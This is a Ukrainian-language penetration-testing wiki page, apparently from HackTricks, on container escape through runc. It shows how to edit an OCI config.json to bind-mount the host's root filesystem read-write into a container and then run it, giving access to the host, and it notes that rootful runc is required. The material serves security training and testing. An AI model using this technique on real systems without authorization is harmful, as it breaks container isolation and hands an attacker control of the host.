# Підвищення привілеїв RunC

## Основна інформація

Якщо ви хочете дізнатися більше про **runc**, перегляньте цю сторінку:

{{#ref}}
../../network-services-pentesting/2375-pentesting-docker.md
{{#endref}}

## PE

Якщо `runc` доступний процесу rootful на хості, можна використати OCI bundle, конфігурація монтування якого рекурсивно виконує bind-mount хостової `/` у `/` всередині контейнера, відкриваючи файлову систему хоста в цьому mount namespace.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
```bash
runc -help #Get help and see if runc is intalled
runc spec #This will create the config.json file in your current folder

Inside the "mounts" section of the create config.json add the following lines:
{
"type": "bind",
"source": "/",
"destination": "/",
"options": [
"rbind",
"rw",
"rprivate"
]
},

#Once you have modified the config.json file, create the folder rootfs in the same directory
mkdir rootfs

# Finally, start the container
# The root folder is the one from the host
runc run demo
```
> [!CAUTION]
> Документований workflow `runc run` працює в режимі rootful: у власних прикладах runc його позначено як "run as root." Непривілейованому користувачеві потрібна конфігурація rootless, наприклад `runc spec --rootless`, і runc зазначає, що для цього режиму мають бути ввімкнені user namespaces.<sup>[[1]](#references)</sup>

## References

- [1] [runc: CLI-інструмент для створення та запуску контейнерів](https://github.com/opencontainers/runc#using-runc)
- [2] [Специфікація середовища виконання OCI: монтування](https://github.com/opencontainers/runtime-spec/blob/main/config.md#mounts)
- [3] [Спільні піддерева](https://docs.kernel.org/filesystems/sharedsubtree.html)
{{#include ../../banners/hacktricks-training.md}}
